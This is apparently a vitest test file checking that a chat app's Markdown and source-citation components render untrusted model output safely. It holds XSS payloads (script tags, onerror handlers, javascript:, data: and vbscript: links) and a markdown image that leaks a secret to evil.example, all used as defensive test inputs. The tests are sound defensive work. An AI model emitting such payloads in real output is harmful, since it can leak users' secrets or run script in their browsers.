import { renderToStaticMarkup as html } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { SourceBody } from '@/components/Citations'
import { Markdown } from '@/components/Markdown'
import type { SourceRef } from '@/lib/api'

// Model output is untrusted (prompt injection, web pages, a stranger's message). These assert on the rendered DOM:
// nothing here may load a picture, run a script or make a live javascript:/data: link (issue #81, FE-01).
const render = (text: string, sources?: SourceRef[]) => html(<Markdown text={text} sources={sources} />)

describe('Markdown renders model text safely', () => {
  it('never renders an image: its description shows as plain text and nothing is fetched', () => {
    const out = render('![secret](https://evil.example/leak?q=owner-secret) and ![](https://evil.example/pixel.png)')
    expect(out).not.toMatch(/<img/i)
    expect(out).not.toContain('evil.example')
    expect(out).toContain('secret')
  })

  it('escapes raw HTML instead of rendering it', () => {
    const out = render('<script>alert(1)</script><iframe src="https://evil.example"></iframe><img src=x onerror=alert(1)><b onclick="x()">hi</b>')
    expect(out).not.toMatch(/<(script|iframe|img|b)\b/i) // escaped text such as `onerror=` is harmless; a real tag is not
    expect(out).toContain('&lt;')
  })

  it.each(['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html;base64,PHNjcmlwdD4=', 'vbscript:msgbox(1)', ' javascript:alert(1)'])(
    'a link to %s is inert',
    (url) => {
      const out = render(`[click me](${url})`)
      expect(out).not.toMatch(/href="\s*(javascript|data|vbscript):/i)
      expect(out).toContain('click me')
    },
  )

  it('opens ordinary links in a new tab without handing over the opener', () => {
    const out = render('[docs](https://example.com/a?b=1)')
    expect(out).toContain('href="https://example.com/a?b=1"')
    expect(out).toContain('target="_blank"')
    expect(out).toContain('rel="noopener noreferrer"')
  })

  it('lets long unbroken text wrap', () => {
    expect(render('x'.repeat(300))).toContain('[overflow-wrap:anywhere]')
  })

  it('keeps a [n] mark from an unknown or hostile source inert', () => {
    const sources: SourceRef[] = [{ n: 1, uri: 'javascript:alert(1)', kind: 'web', title: 'Evil', cited_text: '<b>x</b>' }]
    const out = render('Fact [1] and [2]', sources)
    expect(out).not.toMatch(/href="javascript:/i)
    expect(out).not.toContain('<b>x</b>')
  })
})

describe('SourceBody renders a source safely', () => {
  const src = (over: Partial<SourceRef>): SourceRef => ({ n: 1, uri: 'https://example.com/p', kind: 'web', title: 'Page', cited_text: '', ...over })

  it('links a web page in a new tab, with noopener', () => {
    const out = html(<SourceBody src={src({})} />)
    expect(out).toContain('href="https://example.com/p"')
    expect(out).toContain('rel="noopener noreferrer"')
  })

  it.each(['javascript:alert(1)', 'data:text/html,hi', 'vbscript:x', 'ava://msg/telegram/1'])('has no link for a web source at %s', (uri) => {
    expect(html(<SourceBody src={src({ uri })} />)).not.toMatch(/<a /)
  })

  it('escapes the quoted words and the title, and wraps long text', () => {
    const out = html(<SourceBody src={src({ title: '<img src=x onerror=alert(1)>', cited_text: '<script>alert(1)</script>' })} />)
    expect(out).not.toMatch(/<img|<script/i)
    expect(out).toContain('[overflow-wrap:anywhere]')
  })
})
